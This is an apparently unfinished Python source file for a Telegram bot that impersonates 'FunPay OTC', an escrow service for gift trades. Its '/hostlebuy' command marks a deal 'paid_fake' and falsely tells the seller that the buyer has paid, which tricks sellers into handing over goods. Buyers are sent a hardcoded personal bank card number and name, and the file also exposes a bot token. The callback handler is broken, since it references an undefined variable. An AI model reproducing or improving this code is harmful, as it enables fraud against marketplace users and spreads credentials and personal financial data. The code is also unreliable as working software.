import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode

# Данные бота
bot = Bot(token="8531227508:AAH0hraNjR-yS7_NHj4T29osDXgiqshYO38")
dp = Dispatcher()

# Хранение данных
user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
ADMIN_ID = 7634507602  
MANAGER_CARD = "2204 1201 3279 4013 - Маркин Ярослав"
BANNER_URL = "https://s4.iimage.su/s/08/ge2Mdk3xsEJWX46gzz9mR2PtIurOfg5mz6VqTiJ1.jpg"
SUPPORT_USERNAME = "@FunPaySupportOTC"
banned_users = set()

# --- Вспомогательные функции ---
def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup = None):
    try:
        await callback.message.edit_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    except:
        await callback.message.answer(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

# --- КЛАВИАТУРЫ ---
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]])
welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Продолжить", callback_data="continue")]])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/FunPaySupportOTC")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="curr_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="curr_EUR")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="curr_USDT"), InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ Товар отправлен", callback_data="item_sent")]])

# --- ОБРАБОТКА КОМАНД ---

@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    # ДОБАВЬ ЭТО:
    if user_id in user_deals: 
        del user_deals[user_id] 
    # Проверка на вход по ссылке сделки
    args = message.text.split()
    if len(args) > 1 and args[1].startswith('deal_'):
        deal_id = args[1].replace('deal_', '')
        if deal_id in active_deals:
            deal = active_deals[deal_id]
            deal["buyer_id"] = user_id
            deal["status"] = "active"
            await message.answer(f"🎁 <b>Сделка #{deal_id}</b>\n\nПродавец: @{deal['seller_username']}\nСумма: {deal['amount']} {deal['currency']}\n\nРеквизиты:\n<code>{MANAGER_CARD}</code>\n\nПосле оплаты введите <code>/hostlebuy {deal_id}</code>", parse_mode=ParseMode.HTML)
            return

    await message.answer("🎁 <b>Добро пожаловать!</b>\nСогласны с правилами?", reply_markup=start_keyboard_ru, parse_mode=ParseMode.HTML)

@dp.message(Command("sierrateam"))
async def sierrateam_cmd(message: Message):
    await message.answer("🚀 <b>Sierra Team Panel</b>\nДоступ открыт для всех участников.", parse_mode=ParseMode.HTML)

@dp.message(Command("hostlebuy"))
async def hostlebuy_cmd(message: Message):
    args = message.text.split()
    if len(args) < 2:
        return await message.answer("⚠ Формат: `/hostlebuy ID_СДЕЛКИ`", parse_mode=ParseMode.MARKDOWN)
    
    deal_id = args[1].lower().replace("#", "")
    if deal_id in active_deals:
        deal = active_deals[deal_id]
        deal["status"] = "paid_fake"
        buyer_ref = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
        
        await message.answer(f"✅ Оплата сделки #{deal_id} принята!")
        await bot.send_message(deal["seller_id"], f"💰 Покупатель ({buyer_ref}) оплатил #{deal_id}!\nОтправьте товар и нажмите кнопку подтверждения.", reply_markup=seller_gift_keyboard, parse_mode=ParseMode.HTML)
    else:
        await message.answer("❌ Сделка не найдена.")

# --- ОБРАБОТКА КНОПОК ---

@dp.callback_query()
async def callback_handler(callback: CallbackQuery):
    user_id = callback.from_user.id
    # ДОБАВЬ ЭТО, чтобы кнопки сбрасывали ожидание текста:
    if callback.data in ["create_deal", "continue", "back_to_menu"]:
        if user_id in user_deals:
            del user_deals[user_id]
    # ... дальше твой код

    
    elif data == "continue" or data == "back_to_menu":
        if user_id in user_deals: del user_deals[user_id] # Сброс при выходе в меню
        await bot.delete_message(callback.message.chat.id, callback.message.message_id)
        await bot.send_photo(user_id, photo=BANNER_URL, caption="🎁 <b>FunPay OTC | Меню</b>", reply_markup=main_keyboard_ru, parse_mode=ParseMode.HTML)

    elif data == "create_deal":
        await safe_edit_message(callback, "🛡️ Выберите тип сделки:", deal_type_keyboard_ru)

    elif data == "deal_gift":
        user_deals[user_id] = {"step": "desc"}
        await safe_edit_message(callback, "📝 Введите описание товара (текстом):")

    elif data.startswith("curr_"):
        if user_id in user_deals:
            user_deals[user_id]["curr"] = data.split("_")[1]
            user_deals[user_id]["step"] = "amount"
            await safe_edit_message(callback, f"💰 Введите сумму в {user_deals[user_id]['curr']}:")

# --- ОБРАБОТКА ТЕКСТА ---

@dp.message(F.text)
async def text_handler(message: Message):
    user_id = message.from_user.id
    
    if user_id in user_deals:
        state = user_deals[user_id]
        
        if state["step"] == "desc":
            state["desc"] = message.text
            state["step"] = "curr"
            await message.answer("Выберите валюту:", reply_markup=currency_keyboard_ru)
            
        elif state["step"] == "amount":
            if message.text.startswith("/"): # Если юзер ввел команду вместо числа
                del user_deals[user_id]
                return

            try:
                amt = float(message.text.replace(",", "."))
                d_id = generate_deal_id()
                active_deals[d_id] = {
                    "seller_id": user_id,
                    "seller_username": message.from_user.username or "User",
                    "amount": amt,
                    "currency": state["curr"],
                    "status": "created"
                }
                me = await bot.get_me()
                link = f"https://t.me/{me.username}?start=deal_{d_id}"
                await message.answer(f"✅ <b>Сделка создана!</b>\n\nID: <code>{d_id}</code>\nСсылка: <code>{link}</code>", parse_mode=ParseMode.HTML)
                del user_deals[user_id] # Очистка после завершения
            except:
                await message.answer("❌ Введите сумму числом.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
